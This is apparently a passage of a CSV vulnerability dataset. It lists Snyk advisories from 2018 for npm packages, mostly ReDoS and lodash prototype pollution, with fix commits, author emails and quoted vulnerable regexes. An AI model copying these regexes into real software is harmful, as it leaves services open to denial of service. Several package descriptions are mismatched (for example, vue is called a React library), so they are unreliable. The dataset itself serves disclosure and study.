Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 45k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:dirty-json:20180213,16/02/2018,14/02/2018,https://github.com/RyanMarcus/dirty-json/commit/0b9c15e26699538a11e08e0f168af558392dadbe,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/RyanMarcus/dirty-json/commits/0b9c15e26699538a11e08e0f168af558392dadbe,Ryan Marcus,ryan@rmarcus.info,dirty-json,0b9c15e26699538a11e08e0f168af558392dadbe,(probably) fixed REDOS issues,JavaScript,7.5,high,"dirty-json is a JSON parser that tries to handle non-conforming or otherwise invalid JSON.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/^([a-z0-9-]+,?\s*)+$/) in order toparse single and double quotes. This can cause an impact of about 10 seconds matching time for data 15 characters long.",2018
CVE-2018-7651,CWE-400,Snyk,https://security.snyk.io/vuln/npm:ssri:20180214,16/02/2018,15/02/2018,https://github.com/zkat/ssri/commit/d0ebcdc22cb5c8f47f89716d08b3518b2485d65d,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/zkat/ssri/commits/d0ebcdc22cb5c8f47f89716d08b3518b2485d65d,Kat Marchán,kzm@sykosomatic.org,ssri,d0ebcdc22cb5c8f47f89716d08b3518b2485d65d,"fix(security): tweak strict SRI regex (#10)

The previous form was vulnerable to ReDoS attacks, by
crafting exceptionally long base64 hash strings.

This issue only affected consumers using the opts.strict option.",JavaScript,5.3,medium,"ssri is a Standard Subresource Integrity library --  parses, serializes, generates, and verifies integrity metadata according to the SRI spec. 
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^([^-]+)-([A-Za-z0-9+/]+(?:=?=?))([?\\x21-\\x7E]*)$) in order to match SRI hashes. This can cause an impact of about 10 seconds matching time for data 50k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:citeproc:20180214,16/02/2018,14/02/2018,https://github.com/Juris-M/citeproc-js/commit/df060e95b1545b3767c5ae89b300e410681062f5,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Juris-M/citeproc-js/commits/df060e95b1545b3767c5ae89b300e410681062f5,Frank Bennett,biercenator@gmail.com,citeproc-js,df060e95b1545b3767c5ae89b300e410681062f5,Eliminate backtracking regexp,JavaScript,7.5,high,"citeproc citation formatting module, in common-js format.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^[0-9]{4}(?:-[0-9]{1,2}(?:-[0-9]{1,2})*)*$) in order to match dates. This can cause an impact of about 10 seconds matching time for data 60 characters long.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHDEFAULTSDEEP-450198,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash.defaultsdeep is a Lodash method _.defaultsDeep exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHMERGEWITH-174137,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash.mergewith is a Lodash method _.mergewith exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/npm:lodash:20180130,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash is a modern JavaScript utility library delivering modularity, performance, & extras.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-1107,CWE-400,Snyk,https://security.snyk.io/vuln/npm:is-my-json-valid:20180214,16/02/2018,14/02/2018,https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/mafintosh/is-my-json-valid/commits/b3051b277f7caa08cd2edc6f74f50aeda65d2976,Linus Unnebäck,linus@folkdatorn.se,is-my-json-valid,b3051b277f7caa08cd2edc6f74f50aeda65d2976,"Merge pull request #159 from mafintosh/safe-regex

Avoid catastrophic backtracking",JavaScript,3.7,low,"is-my-json-valid is a universal validation plugin.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/^\S+@\S+$/) in order to validate emails. This can cause an impact of about 10 seconds matching time for data 90K characters long.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHBASEMERGE-450201,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash._basemerge is a The internal Lo-Dash function baseMerge as a Node.js module generated by lodash-cli.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:postcss-inline-base64:20180216,18/02/2018,17/02/2018,https://github.com/lagden/postcss-inline-base64/commit/8b54659ffc6c18761d1bf84f9e9cb2cd3f58c171,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/lagden/postcss-inline-base64/commits/8b54659ffc6c18761d1bf84f9e9cb2cd3f58c171,Thiago Lagden,lagden@gmail.com,postcss-inline-base64,8b54659ffc6c18761d1bf84f9e9cb2cd3f58c171,code refactoring and update devDeps and deps,Unknown,7.5,high,"postcss-inline-base64 is a PostCSS plugin for encode the file to base64.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^(https?:|ftp:)?\/\/([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$) in order to validate URLs. This can cause an impact of about 10 seconds matching time for data 46 characters long.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHES-2434288,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-460130,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"@sailshq/lodash is a fork of Lodash 3.10.x with ongoing maintenance from the Sails core team.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:cejs:20180217,18/02/2018,18/02/2018,https://github.com/kanasimi/CeJS/commit/c6a9ffec1152781f268b8d72d80ee4d8fc837986,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kanasimi/CeJS/commits/c6a9ffec1152781f268b8d72d80ee4d8fc837986,kanasimi,kanasimi@gmail.com,CeJS,c6a9ffec1152781f268b8d72d80ee4d8fc837986,"prevent catastrophic backtracking. e.g., '.'.repeat(300)+'%'
Thanks for James Davis",Markdown,7.5,high,"cejs is a JavaScript module framework.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^([^%]+|%[a-f\d]{2})+$) in order to validate URIs. This can cause an impact of about 10 seconds matching time for data 32 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:validator:20180218,18/02/2018,19/02/2018,https://github.com/chriso/validator.js/commit/19508354cde4e08c75b377321a3d5f910dddee4e,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/chriso/validator.js/commits/19508354cde4e08c75b377321a3d5f910dddee4e,Chris O'Hara,cohara87@gmail.com,validator.js,19508354cde4e08c75b377321a3d5f910dddee4e,Patch a REDOS,Markdown,3.7,low,"validator is a library of string validators and sanitizers.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (^\s*data:([a-z]+\/[a-z0-9\-\+]+(;[a-z\-]+=[a-z0-9\-]+)?)?(;base64)?,[a-z0-9!\$&',\(\)\*\+,;=\-\._~:@\/\?%\s]*\s*$) in order to validate Data URIs. This can cause an impact of about 10 seconds matching time for data 70K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:valid-data-url:20180214,16/02/2018,14/02/2018,https://github.com/killmenot/valid-data-url/commit/64bad3cf1eff246103d71b51f945d7ea73bf7adf,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/killmenot/valid-data-url/commits/64bad3cf1eff246103d71b51f945d7ea73bf7adf,Alexey Kucherenko,alexei.kucherenko@gmail.com,valid-data-url,64bad3cf1eff246103d71b51f945d7ea73bf7adf,fix ReDoS exploit,Markdown,5.3,medium,"valid-data-url is a universal validation plugin.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^\s*data:([a-z]+\/[a-z0-9-+.]+(;[a-z-]+=[a-z0-9-]+)?)?(;base64)?,([a-z0-9!$&',()*+;=\-._~:@\/?%\s]*?)\s*$) in order to validate data URLs. This can cause an impact of about 10 seconds matching time for data 70k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:nicest:20180213,16/02/2018,14/02/2018,https://github.com/ChristianMurphy/nicest/commit/118b11767e70c39f0784f7b9a7c4c477d3688c27,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/ChristianMurphy/nicest/commits/118b11767e70c39f0784f7b9a7c4c477d3688c27,Christian Murphy,Christian.Murphy.42@gmail.com,nicest,118b11767e70c39f0784f7b9a7c4c477d3688c27,"fix: simply regex to any lower case letter, number, space, or comma",JavaScript,7.5,high,"nicest is a setup tool for software educators.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/^([a-z0-9-]+,?\s*)+$/) in order to validate a user's choice of messaging platform. This can cause an impact of about 10 seconds matching time for data 32 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:q-io:20180212,16/02/2018,14/02/2018,https://github.com/kriskowal/q-io/commit/b9c54c809c48306835506a3baad5dab67bec9dab,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kriskowal/q-io/commits/b9c54c809c48306835506a3baad5dab67bec9dab,Harold Thétiot,hthetiot@gmail.com,q-io,b9c54c809c48306835506a3baad5dab67bec9dab,"Merge pull request #165 from kriskowal/bugs/HeaderRangeRegExpDos

do not split range header values using RegExp",JavaScript,7.5,high,"q-io contains interfaces for IO that make use of promises.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/^\s*bytes\s*=\s*(\d*\s*-\s*\d*\s*(?:,\s*\d*\s*-\s*\d*\s*)*)$/) in order to parse custom I/O ranges. This can cause an impact of about 10 seconds matching time for data 100 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:mimer:20180210,16/02/2018,11/02/2018,https://github.com/data-uri/mimer/commit/50ba6424f68543ccda61652b1e12e64fb87e33c2,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/data-uri/mimer/commits/50ba6424f68543ccda61652b1e12e64fb87e33c2,Helder Santana,helder.css@gmail.com,mimer,50ba6424f68543ccda61652b1e12e64fb87e33c2,Remove potential REDOS vulnerability,Unknown,5.3,medium,"mimer contains interfaces for IO that make use of promises.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (^([\s\S]*?)((?:\.{1,2}|[^\\\/]+?|)(\.[^.\/\\]*|))(?:[\\\/]*)$) in order to parse UNIX paths to get the extension. This can cause an impact of about 10 seconds matching time for data 50K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:htmllint:20180213,16/02/2018,14/02/2018,https://github.com/htmllint/htmllint/commit/eec921cee4327d7fe02ba6812bc39dc29f46b12a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/htmllint/htmllint/commits/eec921cee4327d7fe02ba6812bc39dc29f46b12a,Marshall Lochbaum,mwlochbaum@gmail.com,htmllint,eec921cee4327d7fe02ba6812bc39dc29f46b12a,Simplify BEM RegExp and prevent catastrophic backtracking,JavaScript,7.5,high,"htmllint is an unofficial html5 linter and validator.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/^([a-z][a-z\d]*(-[a-z\d]+)*(--[a-z\d]+)*(__[a-z\d]+)*)+$/) in order to validate data URLs. This can cause an impact of about 10 seconds matching time for data 15 characters long.",2018
CVE-2018-25074,CWE-400,Snyk,https://security.snyk.io/vuln/npm:skeemas:20180225,25/02/2018,25/02/2018,https://github.com/Prestaul/skeemas/commit/65e94eda62dc8dc148ab3e59aa2ccc086ac448fd,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Prestaul/skeemas/commits/65e94eda62dc8dc148ab3e59aa2ccc086ac448fd,Matt Dunlap,mpdunlap@gmail.com,skeemas,65e94eda62dc8dc148ab3e59aa2ccc086ac448fd,"Resolved potential ReDoS issue with uri format regexp.

Special thanks to James Davis <davisjam@vt.edu> for finding and reporting the vulnerability",JavaScript,3.7,low,"skeemas  is a comprehensive JSON Schema (drafts 3 and 4) validation
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 30K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:truncate:20180225,25/02/2018,25/02/2018,https://github.com/FGRibreau/node-truncate/commit/a3cea056427b2dfbbffebf24a95419b09db23b22,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/FGRibreau/node-truncate/commits/a3cea056427b2dfbbffebf24a95419b09db23b22,Francois-Guillaume Ribreau,github@fgribreau.com,node-truncate,a3cea056427b2dfbbffebf24a95419b09db23b22,"Merge pull request #6 from davisjam/FixREDOS

Fix redos",JavaScript,7.1,high,"truncate  is a package to helps truncate text and keeps urls safe.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 20K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:sanitize:20180225,25/02/2018,25/02/2018,https://github.com/pocketly/node-sanitize/commit/4fd57530367ea9f2570b1e57d1a1a32e7f5d644f#diff-bd042f5439b55acdcce363c79e2f55d6R148,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/pocketly/node-sanitize/commits/4fd57530367ea9f2570b1e57d1a1a32e7f5d644f#diff-bd042f5439b55acdcce363c79e2f55d6R148,Janghwan Lee,cheesespy@gmail.com,node-sanitize,4fd57530367ea9f2570b1e57d1a1a32e7f5d644f,regex security fix.,JavaScript,7.5,high,"sanitize  is an input sanitizing library for node.js
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 250 characters long.",2018
CVE-2018-25049,CWE-400,Snyk,https://security.snyk.io/vuln/npm:email-existence:20180225,25/02/2018,25/02/2018,https://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/nmanousos/email-existence/commits/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,Jamie Davis,davisjam@vt.edu,email-existence,0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,"security: address REDOS by rejecting long emails

The email regex /^\S+@\S+$/ is vulnerable to REDOS on very long emails.
Emails should not be longer than 300 characters per the RFC errata.
Reject emails longer than this.",JavaScript,3.7,low,"email-existence checks existence of email addresses.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 100K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:datatype-expansion:20180225,25/02/2018,25/02/2018,https://github.com/raml-org/datatype-expansion/commit/7e7a52b13888bfcabc953bbe0c53b1f30e15dea6,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/raml-org/datatype-expansion/commits/7e7a52b13888bfcabc953bbe0c53b1f30e15dea6,Leah,ulliftw@gmail.com,datatype-expansion,7e7a52b13888bfcabc953bbe0c53b1f30e15dea6,"Fix for potential regex backtracking vulnerability

Signed-off-by: Leah <ulliftw@gmail.com>",JavaScript,5.3,medium,"datatype-expansion  is a utility tool to expand a given type and create a canonical form.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 60 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:astronomia:20180225,25/02/2018,25/02/2018,https://github.com/commenthol/astronomia/commit/223275f8531ba22d68421465737ce02e1952df89,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/commenthol/astronomia/commits/223275f8531ba22d68421465737ce02e1952df89,commenthol,commenthol@gmail.com,astronomia,223275f8531ba22d68421465737ce02e1952df89,fix regex,JavaScript,3.7,low,"astronomia is a translation of meeus from Go to Javascript and contains selected algorithms from the book ""Astronomical Algorithms"" by Jean Meeus, following the second edition
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 17k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:valid-email:20180222,22/02/2018,21/02/2018,https://github.com/johnhenry/valid-email/commit/2974cff04c5902144eb24ea59e865c9cdbf9c7da,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/johnhenry/valid-email/commits/2974cff04c5902144eb24ea59e865c9cdbf9c7da,John,john@iamjohnhenry.com,valid-email,2974cff04c5902144eb24ea59e865c9cdbf9c7da,Extend warning.,Markdown,5.3,medium,"valid-email is an email validation package.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 90 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:address-rfc2822:20180225,25/02/2018,25/02/2018,https://github.com/haraka/node-address-rfc2822/commit/deeabeb61ddf97d0da48717a668e09f81031ba07,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/haraka/node-address-rfc2822/commits/deeabeb61ddf97d0da48717a668e09f81031ba07,Matt Sergeant,helpme+github@gmail.com,node-address-rfc2822,deeabeb61ddf97d0da48717a668e09f81031ba07,Fix possible catastrophic backtracking bug (#28),Markdown,7.5,high,"address-rfc2822  is a parser for RFC2822 (Header) format email addresses.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 45 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:vue:20180222,22/02/2018,21/02/2018,https://github.com/vuejs/vue/commit/cd334070f3b82d3f5892c4999cc290ccd4f56fd8,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/vuejs/vue/commits/cd334070f3b82d3f5892c4999cc290ccd4f56fd8,Evan You,yyx990803@gmail.com,vue,cd334070f3b82d3f5892c4999cc290ccd4f56fd8,fix: address potential regex backtrack,JavaScript,3.7,low,"vue is a React UI component library that uses inline styles to avoid CSS dependencies and prevent leaky global styles from affecting an application.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 70k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:shaka-player:20180222,22/02/2018,21/02/2018,https://github.com/google/shaka-player/commit/0a2190246ced4935fc47cb624b88e1d030741a61,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/google/shaka-player/commits/0a2190246ced4935fc47cb624b88e1d030741a61,Jacob Trimble,modmaker@google.com,shaka-player,0a2190246ced4935fc47cb624b88e1d030741a61,"Fix catastrophic backtracking in TTML text parser.

Issue #1312

Change-Id: I0aed14068776a800eee35f03d2f878db0dd565b6",JavaScript,3.7,low,"shaka-player is a parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 300 characters long.
Note: Shaka Player is not meant for server side use, though not impossible.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:moddle-xml:20180222,22/02/2018,21/02/2018,https://github.com/bpmn-io/moddle-xml/commit/e2b5ba0a79b16af48a4ec9fa8b605ea4e0111c17,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/bpmn-io/moddle-xml/commits/e2b5ba0a79b16af48a4ec9fa8b605ea4e0111c17,Nico Rehwaldt,nico.rehwaldt@camunda.com,moddle-xml,e2b5ba0a79b16af48a4ec9fa8b605ea4e0111c17,fix(reader): make regex non-catastropic,JavaScript,3.7,low,"moddle-xml is a package to wead and write XML documents described with moddle.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 19K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:xlsx:20180222,22/02/2018,21/02/2018,https://github.com/SheetJS/js-xlsx/commit/88e9e31ebf067c40b58c84dc1a7a842750c379ba,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/SheetJS/js-xlsx/commits/88e9e31ebf067c40b58c84dc1a7a842750c379ba,mugai17,32584170+mugai17@users.noreply.github.com,js-xlsx,88e9e31ebf067c40b58c84dc1a7a842750c379ba,fix infinite recursion,JavaScript,3.7,low,"xlsx is a parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 40k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:harb:20180222,22/02/2018,21/02/2018,https://github.com/SheetJS/js-xlsx/commit/88e9e31ebf067c40b58c84dc1a7a842750c379ba,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/SheetJS/js-xlsx/commits/88e9e31ebf067c40b58c84dc1a7a842750c379ba,mugai17,32584170+mugai17@users.noreply.github.com,js-xlsx,88e9e31ebf067c40b58c84dc1a7a842750c379ba,fix infinite recursion,JavaScript,3.7,low,"harb is a parser and writer for various spreadsheet formats.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 40k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:node-pg-migrate:20180220,20/02/2018,21/02/2018,https://github.com/salsita/node-pg-migrate/commit/07ba543b407d0e5e3d24f441509d13c81584b01b,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/salsita/node-pg-migrate/commits/07ba543b407d0e5e3d24f441509d13c81584b01b,Jan Doležel,dolezel.jan@gmail.com,node-pg-migrate,07ba543b407d0e5e3d24f441509d13c81584b01b,Removing regex (#198),JavaScript,5.3,medium,"node-pg-migrate is a Node.js database migration management built exclusively for postgres.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (.+\(.*\)) in order to generate a coulumn of strings. This can cause an impact of about 10 seconds matching time for data 3K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:markdown-js:20180221,22/02/2018,21/02/2018,https://github.com/Gozala/markdown-js/commit/5c5de1f60d72fdb5fc4551a9cf3438944ec45de3,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Gozala/markdown-js/commits/5c5de1f60d72fdb5fc4551a9cf3438944ec45de3,Irakli Gozalishvili,rfobic@gmail.com,markdown-js,5c5de1f60d72fdb5fc4551a9cf3438944ec45de3,Deal with reported vulnerablity issues.,Markdown,5.3,medium,"markdown-js is a markdown parser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 65 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:gettext-parser:20180220,20/02/2018,21/02/2018,https://github.com/smhg/gettext-parser/commit/b3aa4a753101b3b9793c5b7c28bbcecbf77548d3,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/smhg/gettext-parser/commits/b3aa4a753101b3b9793c5b7c28bbcecbf77548d3,smhg,sam.hauglustaine@gmail.com,gettext-parser,b3aa4a753101b3b9793c5b7c28bbcecbf77548d3,fix catastrophic backtracking vulnerability (closes #39),JavaScript,3.7,low,"gettext-parser is a package to parse and compile gettext po and mo files with node.js.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. It used a regular expression (/([\x21-\x40\x5b-\x60\x7b-\x7e]+)[^\x21-\x40\x5b-\x60\x7b-\x7e]*$/) in order to split strings. This can cause an impact of about 10 seconds matching time for data 33K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:deckardcain:20180220,20/02/2018,21/02/2018,https://github.com/apiaryio/deckardcain/commit/571d6715585e56bd0ec23b1c40966a4aedb25750,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/apiaryio/deckardcain/commits/571d6715585e56bd0ec23b1c40966a4aedb25750,Vladimir Gorej,vladimir.gorej@gmail.com,deckardcain,571d6715585e56bd0ec23b1c40966a4aedb25750,fix: make regex expressions simpler and faster,JavaScript,3.7,low,"deckardcain is a package to parse and compile gettext po and mo files with node.js.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 3K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:html-dom-parser:20180220,20/02/2018,21/02/2018,https://github.com/remarkablemark/html-dom-parser/commit/b80d699bbbd45d254379e6916152c918998e3b10,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/remarkablemark/html-dom-parser/commits/b80d699bbbd45d254379e6916152c918998e3b10,Mark,mark@remarkablemark.org,html-dom-parser,b80d699bbbd45d254379e6916152c918998e3b10,"test: update and refactor tests

Rename test directory, add more test cases (capitalized tags),
and improve readability of output.",HTML,3.7,low,"html-dom-parser is a HTML to DOM parser that works on both the server and client.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (/<head[\s\S]*>[\s\S]*<\/head>/ and /<body[\s\S]*>[\s\S]*<\/body>/) in order to find html tags. This can cause an impact of about 10 seconds matching time for data 65K characters long.",2018
CVE-2018-1109,CWE-400,Snyk,https://security.snyk.io/vuln/npm:braces:20180219,19/02/2018,20/02/2018,https://github.com/micromatch/braces/commit/abdafb0cae1e0c00f184abbadc692f4eaa98f451,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/micromatch/braces/commits/abdafb0cae1e0c00f184abbadc692f4eaa98f451,jonschlinkert,jon.schlinkert@sellside.com,braces,abdafb0cae1e0c00f184abbadc692f4eaa98f451,optimize regex,JavaScript,3.7,low,"braces is a Bash-like brace expansion, implemented in JavaScript.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (^\{(,+(?:(\{,+\})*),*|,*(?:(\{,+\})*),+)\}) in order to detects empty braces. This can cause an impact of about 10 seconds matching time for data 50K characters long.",2018
